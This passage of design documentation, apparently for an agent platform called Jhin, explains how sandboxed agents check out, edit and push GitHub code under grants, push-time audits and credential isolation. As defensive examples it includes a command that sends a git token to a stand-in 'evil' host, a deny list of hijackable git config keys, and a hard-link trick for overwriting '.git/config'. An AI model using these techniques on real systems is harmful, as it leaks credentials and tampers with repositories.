`[\w.-]+/[\w.-]+` and as a directory traversal to everything that joins the
value onto a path — the clone URL, and the `/repos/<repository>` paths the
GitHub tools build — which would walk out of the prefix the credential's scope
was written around. Allow-list entries are matched a segment at a time for the
same reason (`fnmatch`'s `*` crosses `/`, so `octo*` would otherwise cover
`octo-labs/anything`); the single entry `*`, which migration 0038 grandfathers
onto connections that predate the list, still means every repository — but
never a name that is not one. A
grant that pins `image` or `network` matches only a call that explicitly
carries that field; relying on a connection default does not broaden the grant.

## Giving an agent code work

An agent edits code only inside a sandbox job, and the change reaches the
repository only through `cli.repository.push` — a script Jhin writes, not a
command the agent writes. The way in is the **Code editing** capability
bundle: the setup dialog on the agent's Tools & Access tab (or **Give to an
agent…** on the GitHub connection), or `jhin-admin agent grant --bundle
code-editing --create-sandbox` on the console
([agent-access](../operations/agent-access.md)). Either one does the setup
below in one transaction and refuses, by sentence, anything the gateway would
deny anyway.

1. **Connections.** A `github` connection (a fine-grained PAT is the shortest
   path) for the repository, and a `cli` connection (auth type `none`) whose
   `git_connection_id` points at it and whose **`allowed_repositories`** lists
   the repositories this instance may touch. The bundle creates the `cli`
   connection for you, pointing at the GitHub connection you chose, with the
   allow-list you gave it (`*` for every repository the token can reach); it
   can be narrowed later on the connection (`PATCH /connections/{id}/config`,
   the *Allowed repositories* editor under Apps). That list is deny-by-default:
   a CLI connection with an empty list can neither check out nor push
   anything, and a grant naming a repository outside it is refused when it is
   written. Scope the GitHub token to the same repositories — Jhin's
   allow-list is the one you can edit, GitHub's is the one that cannot be
   argued with. Leave `default_network` at `none`; only checkout and push
   reach the bridge, and they set that themselves.
2. **Grants** (what the bundle writes; the rows are ordinary grants and show
   under Capability grants):

   | Capability | Scope | Why |
   | --- | --- | --- |
   | `cli.repository.checkout` | `connection_id`, `repository` | clone + start (or resume) the `agent/<repo>-<task id>` branch |
   | `cli.file.list` | `connection_id`, `path` | see what is in the repository |
   | `cli.file.search` | `connection_id`, `path` | find a symbol before reading it |
   | `cli.file.read` | `connection_id`, `path` | read a page of a file, with a `read_token` |
   | `cli.file.edit` | `connection_id`, `path` | change part of a file by exact string |
   | `cli.file.write` | `connection_id`, `path` | write a whole file (needs the `read_token`) |
   | `cli.test.run` | `connection_id`, `command` | run the test command, always isolated |
   | `cli.repository.push` | `connection_id`, `repository`, `branch: "agent/*"` | commit and push the working branch |
   | `github.repository.list` | `connection_id`, `repository` (bounds the rows, not the call) | find the repository's `owner/name` |
   | `github.repository.read` | `connection_id`, `repository` | inspect the repository |
   | `github.pull_request.read` | `connection_id`, `repository` | read pull requests |
   | `github.pull_request.create` | `connection_id`, `repository`, `base: "*"` | open the PR from the pushed branch |

   `connection_id` and `repository` are **required** grant scope keys on
   checkout and push: a bare `cli.*` grant cannot reach a repository, and
   `POST /grants` now refuses a row that lacks a required key rather than
   writing one the gateway denies on every call. `base` defaults to `*`
   (any base branch); the dialog's *Advanced* step narrows it.
   Deleting a connection revokes every grant pinned to it (each audited with
   `reason: connection.deleted`), and a grant pinned to a connection that is
   not active is not advertised to the model at all — disabling revokes
   nothing, so re-enabling brings the tools back.
   `cli.command.execute` is deliberately **not** in this bundle. It remains in
   the product as an operator-granted escape hatch for builds and linters, and
   it never receives a git credential.
3. **Step budget.** A checkout → list → search → read → test → edit → test →
   push → PR flow is nine calls before the agent reports back; give the agent
   at least 12 steps.

### Why push is its own tool

A grant scope is one `fnmatch` over a shell string, so `command: "git *"` also
matches `git commit -m x && curl https://evil/?t=$GIT_TOKEN`. No scope on a
shell string is a boundary. So the tools that hold the credential run scripts
Jhin writes, and the model supplies no remote, no refspec and no shell. Before
`cli.repository.push` pushes anything it checks, in order:

0. Jhin's own audit trail carries a `sandbox.checkout.recorded` row for this
   run naming this repository (`no_checkout_record`). The checkout writes it —
   base ref, head sha, and the sha256 of `.git/config` as Jhin left it — into a
   table no sandbox job can reach. Every check below that needs to know what
   the repository *should* look like reads it from there. The row is written
   only when all three values are there and well-shaped, and the push refuses
   a record missing either the base ref or the config sha rather than dropping
   the comparison that needs it: an incomplete record is no record.
1. `/workspace/repo` exists (`no_checkout`);
2. the branch it was asked to push is the one checked out
   (`branch_not_checked_out`);
3. the branch is neither `main`, `master`, `HEAD`, nor **the base ref the
   checkout recorded** (`push_to_base_refused`). Not
   `refs/remotes/origin/HEAD`: that is the remote's default branch, which is a
   different question, and it is a ref inside the repository the agent has been
   editing;
4. `git config --local` contains only keys a Jhin checkout produces — any
   `credential.*`, `url.*.insteadOf`, `http.*`, `core.hooksPath`,
   `core.sshCommand`, `include.*` or `alias.*` stops the push
   (`repo_config_tampered`, recorded as the audit action
   `sandbox.repo_config_tampered`, which is a security event and not merely a
   tool error);
5. `remote.origin.url` holds **exactly one** value and it is the URL Jhin
   cloned (`remote_rewritten`). Counting matters: the key is allowed, so a
   name-only audit passes a remote that has been given a second URL, and
   `git remote get-url origin` reports only the first by design while
   `git push origin` delivers to every one of them. The refusal records the
   URLs it saw, so the audit names where the objects would have gone;
6. `.git/config` hashes to the sha the checkout recorded
   (`repo_config_tampered`). This is the catch-all under 4 and 5: whatever a
   sandbox job did to the file, and by whatever key nobody enumerated, it is
   not what Jhin left there.

Then the push itself goes to **the URL Jhin computes**, not to the name
`origin`:

```
git … push <clone url> refs/heads/<branch>:refs/heads/<branch>
```

`origin` is a pointer the container owns; the URL is Jhin's. So even with every
audit above bypassed, a rewritten remote redirects nothing. The push is never
forced, and the refspec is always `refs/heads/<branch>:refs/heads/<branch>`.

**Nothing in this list asks the container a question it could lie about.** That
is the rule the whole tool is built on, because between the model's last visible
action and the human's approval sits `cli.test.run`, whose command is arbitrary
and whose working directory is the checkout.

### How the credential is delivered

The token is resolved from the GitHub connection named by the CLI connection's
`git_connection_id` — admin-set, never chosen by a tool call — and injected as
job-scoped `secret_env["GIT_TOKEN"]`. Jhin's own git command line then carries:

```
git -c credential.helper= \
    -c credential."<git base>".helper='!f() { test "$1" = get && { echo username=x-access-token; echo "password=$GIT_TOKEN"; }; }; f' \
    -c core.hooksPath=/nonexistent <clone|push …>
```

- the empty `credential.helper=` resets the inherited helper list, so a helper
  planted anywhere else cannot answer first;
- git's own URL matcher decides whether the helper runs, so a push to any other
  host never invokes it;
- the fallbacks are `GIT_ASKPASS=/bin/false` and `GIT_TERMINAL_PROMPT=0`, both
  hard errors, so the token is unreachable rather than merely un-echoed;
- the helper lives on a command line, not in `.git/config`, so it is not in a
  file the agent can rewrite and it never persists.

Every credentialed job also sets `GIT_CONFIG_NOSYSTEM=1` and
`GIT_CONFIG_GLOBAL=/dev/null`, so neither a system config nor a planted
`/workspace/.gitconfig` can contribute a helper.

### `.git` is not reachable through the file tools

Every file tool refuses git's own state three times:

1. `cli/schemas.py` rejects any path with a `.git` segment, a first segment of
   `.git`/`.gitconfig`/`.gitmodules`, or anything starting `.jhin`;
2. each file job re-resolves the path with `realpath` inside the sandbox before
   touching it, so a symlink named something innocent cannot smuggle a write
   into `.git` or out of the checkout;
3. the same guard refuses a regular file whose link count is not 1.

The third is the one the first two cannot do. `ln .git/config cfg` creates no
symlink and adds no path segment: the schema is shown `cfg`, `realpath`
resolves `cfg` to `<root>/cfg`, and both are telling the truth about a file
that is also git's. Writing it truncates the shared inode. A regular file the
file tools may touch has exactly one name; `cli.file.edit` asks its own open
descriptor (`os.fstat`), so no link can appear between the check and the write.

`.github/**`, `.gitignore` and `.gitattributes` stay editable — they are
ordinary repository content, and the config-based attacks they might otherwise
enable are closed by the environment above and by the push-time config audit.

### Approvals

`cli.repository.push` is `ELEVATED`. Under the wizard's default **balanced**
preset — and under the risk defaults a new agent has before any policy is set —
that means a human approves the first thing that leaves the sandbox, while
everything before it runs uninterrupted. **Autonomous runs ELEVATED tools
automatically**, so the Code-editing bundle also ships an explicit policy rule
(`capability: "cli.repository.push", action: "approval"`), written both by the
agent wizard and by the **Code editing** toggle on an agent's Tools & Access
tab. A capability-matched rule is found before a risk-matched one, so the gate
holds under Autonomous.

It also survives a later change of mode. An approval **preset** is a statement
about risk levels — every rule it expands to is `capability: "*"` — so
`PUT /policy {"preset": …}` (the chat sidebar's mode buttons and the same
buttons on Tools & Access) restates those rules and keeps the ones a preset
does not speak for, at the front of the list where first-match reaches them.
The preset still reads as selected in the UI while such a rule is present, so
nothing invites a click to "fix" an unselected-looking mode.

Two ways the gate is still absent, both deliberate and both visible on the
Permissions tab: an agent configured by hand under Autonomous that never
received the rule, and one whose rules were edited explicitly —
`PUT /policy {"rules": […]}` persists exactly the list it is given, and that
is how a rule is deliberately removed.

`github.pull_request.create` stays `WRITE`/auto: push is the gate, and
prompting twice for one logical action is worse than not.

### Images and networks

`cli.test.run` always runs with `network: "none"`. Its command is arbitrary and
its working directory is the checkout, so the egress decision is Jhin's, not the
model's. It is **WRITE** risk for the same reason: it is named after tests, but
it is a shell that can change any file in the checkout, and a grant scope is one
`fnmatch` over the string — `"python3 -m pytest*"` matches
`python3 -m pytest -x; <anything>`. WRITE still runs unattended under Autonomous
and Balanced, which is deliberate; Restricted, which promises no unattended
writes, now sees it. Containment is structural rather than risk-level:
`cli.repository.push` trusts nothing this command could have touched.
Operators who need networked commands enable **Terminal Internet** in an
agent's **Tools & Access** tab and choose its CLI Sandbox. This grants
`cli.command.execute` with that `connection_id`, `network: "internet"`, and
`command: "*"`; existing approval rules still apply. For narrower command
permissions, use the advanced grant editor. The agent must select the
Internet-capable command tool rather than `cli.test.run`.

This works on a self-hosted Docker installation without a public domain or an
external authentication service. Internet jobs use the runner's dedicated
sandbox bridge, never host networking or the control-plane network. They can
reach destinations allowed by the host's network; this is not a domain
allow-list. Git checkout/push and app API permissions are separate.

The admin API is `GET` / `PUT`
`/api/v1/workspaces/{workspace_id}/agents/{agent_id}/terminal-internet`.
Enable with `{"enabled":true,"connection_id":"<active CLI UUID>"}`; disable
with `{"enabled":false}`. Both require `agents:admin`. API keys also need
`apps:read` to see connection IDs and names in the response.

Updates lock the agent and atomically replace only this control's grants,
whose ownership is recorded in permission audit events. An identical existing
grant is recognized without being duplicated or adopted. Switching sandboxes
removes the previous managed allow. Turning access off writes an explicit
`cli.command.execute` deny for `network: "internet"`, so broad wildcard allows
cannot bypass the switch. Validation checks the resolved connection default
as well as an explicit network selection, including after approval waits.
Handmade grants and approval policies stay intact. A custom state or warning
means advanced permissions can independently allow access or restrict
individual commands; turning the control on does not override those denies.

Images are pre-built on the Docker host and selected by the `image` scope key.
**The runner never pulls**, so a grant's `image` value can never reach a
registry.

### How a job reports back

Everything Jhin learns from a job — the checkout's head, base and config sha,
a file's line count and `read_token`, the shas a push moved — arrives as a
trailer on the job's stdout, after the payload because the runner keeps the
*tail* of oversized output. That makes the parser, not the position, the thing
that has to be trustworthy, because repository content shares the stream:
`git` allows a newline in a file name, so a repository can hold a file called
`z⏎JHIN_META` and print a second trailer through any listing of it. Four
rules, all four needed:

- the sentinel carries a **nonce belonging to the tool call**, which nothing in
  the container can predict: HMAC-SHA256 over the tool call id, keyed on the
  runner token, which never enters a container. Per call rather than per
  dispatch, because the runner answers a re-dispatch with the *first*
  dispatch's job and its output — a nonce drawn per attempt made that answer
  unreadable to the attempt receiving it, and every value in it silently
  defaulted. A container can of course see the sentinel of the job it is, since
  its own script prints it, and can predict no other call's;
- it must appear **exactly once** — two sentinels mean the stream is ambiguous,
  and an ambiguous trailer is discarded rather than resolved in favour of
  whoever printed last;
- **no content-derived byte is printed inside the region**: every value a
  repository decides — the checkout's top-level listing, `cli.file.list`'s
  rows, `cli.file.search`'s matches — is collected before the sentinel and
  emitted as a single base64 word, so a file name cannot contribute a line
  break, a key, or a sentinel of its own. Inside the encoding the records are
  NUL-separated, because NUL is the one byte a path cannot hold: a tab or a
  colon in a name is then data rather than a field separator, and
  `cli.file.search` runs `grep -Z` so grep terminates the name with a NUL
  instead of the `:` the parser used to split on;
- **exactly one thing emits the sentinel.** A second emitter is how a sentinel
  and its parser drift apart, and the drift is silent — the trailer simply
  stops being found and every value read from it comes back empty.
  `cli.file.edit` shipped that way: the Python program that does the edit wrote
  the pre-nonce bare marker while the tool parsed the nonce form, so its
  documented `read_token` was always `""` and the follow-up `cli.file.write`
  was refused with `file_exists_pass_read_token`. The program now writes only
  `key=value` lines into a variable and the shell prints the sentinel ahead of
  them, exactly as every other tool does.

A job whose trailer cannot be read reports nothing rather than something: the
checkout refuses (`checkout_unrecordable`) and writes no record, which leaves
the next push with nothing to trust and refuses that too. A listing whose word
was cut by the size cap reports the rows it could read and says `truncated`.

Refusals travel the other way, as a `JHIN_ERR=` line on stderr, and that stream
is shared with `git` — which prints file names verbatim. So a `JHIN_ERR` line
counts only when the job exited with one of the codes Jhin's own scripts
reserve (65-69). Everything those codes name is reported as *proven side-effect
free*, and a push that died after touching the remote exits with git's code,
never one of these.

What the agent sees: the checkout returns the working branch, the base ref it
was cut from, and the top-level entries, so it can start navigating a
repository nobody handed it a file path for. Names in every listing are
repository content, so any character Python does not consider printable is
shown as `?` — the file tools' schema refuses such a path anyway. That is a
wider net than "below U+0020" on purpose: `str.splitlines` also breaks on
U+000B, U+000C, U+001C–U+001E, U+0085 and U+2028/U+2029, so a name carrying one
of those would otherwise look like one line where it was escaped and like two
everywhere after. `cli.file.read` returns a line
window plus `total_lines`, `has_more` and a `read_token` — the sha256 of the
whole file, computed in the sandbox — and `cli.file.write` requires that token
back, so reading part of a file and writing back what you read is refused
rather than silently destroying the rest. The fake GitHub (like real GitHub)
refuses a pull request whose head has no commits beyond the base, so a branch
created through the refs API without a push cannot produce an empty PR.

## Live terminal output

The runner follows stdout and stderr independently while a container runs. Each
capture keeps a bounded tail plus the longest registered secret's overlap;
complete logs are never assembled in memory. Both live and final snapshots are
redacted before leaving the runner. An unfinished secret prefix remains hidden
even when the logging connection ends or fails.

For `cli.command.execute` and `cli.test.run`, the tool worker's existing one-second
status poll also writes changed output tails to `sandbox_job` on an independent
connection. Its own redactor handles worker-only credentials, including partial
secrets at clipped snapshot edges, before the 8,192-character persistence cap.
Writes are bounded and best effort, match workspace/run/tool/job identity, and
only update unfinished running rows. Progress never dispatches, cancels, retries,
or completes a command. Final output follows the existing terminal commit path.

The authorized conversation/run tool-call responses expose these tails for chat
polling. Consumers replace snapshots rather than append them as deltas. Output
may be buffered by the program itself; an empty snapshot does not prove it is
idle. The saved `started_at` is dispatch evidence, not a measured process start.
The actual `network_policy` is included in progress and command-style results;
no current-directory value is inferred. File/repository tool evidence trailers
are excluded from the live terminal view.

## Configuration ownership

| Variable | Owner | Meaning |
| --- | --- | --- |
| `SANDBOX_RUNNER_TOKEN` | tool-worker + runner | bearer token; an empty value denies requests |
| `SANDBOX_RUNNER_URL` | tool-worker | fixed internal runner base URL |
| `SANDBOX_DEFAULT_IMAGE` | tool-worker + runner | reviewed default job image |
| `SANDBOX_NETWORK` | runner | unique dedicated bridge for `internet` jobs |
| `SANDBOX_RUNNER_IMAGE` | Compose | identical local runner/adapter image tag |
| `PHASE10_ROOTLESS_DOCKER_SOCKET` | rootless overlay | verified host-UID-10001 daemon socket; no GID applies |
| `SANDBOX_DOCKER_SOCKET_HOST` | rootful + desktop overlays | rootful: verified absolute root-owned non-symlink socket; desktop: resolved Docker Desktop socket (default `/var/run/docker.sock`) |
| `SANDBOX_DOCKER_GID` | rootful overlay | exact positive numeric group of that socket; forbidden in desktop mode |
| `PHASE10_DESKTOP_DOCKER_SOCKET` | desktop harness preflight | host path (symlink allowed) resolved to the real Docker Desktop socket |
| `SANDBOX_MAX_*` | runner | hard CPU, memory, pids, timeout, and output caps |

The runner and adapter receive no master key, database DSN, NATS credentials,
or connector allowlist. Job requests are filtered so `DOCKER_*`,
`SANDBOX_DOCKER_*`, known socket paths, and adapter endpoint values cannot be
forwarded even if a caller attempts to provide them.

## Host support

The two server-grade authority modes are Linux rootless Docker with host UID
10001 and Linux rootful Docker with a real root-owned non-symlink socket. A
Docker Desktop compatibility symlink does not satisfy the rootful contract; on
macOS or Windows use the explicit, development-only `desktop` mode described
above. Nested Docker-in-LXC is safe only when the outer host provides secure
nested-container isolation; a permissive nesting configuration can void every
guarantee above.
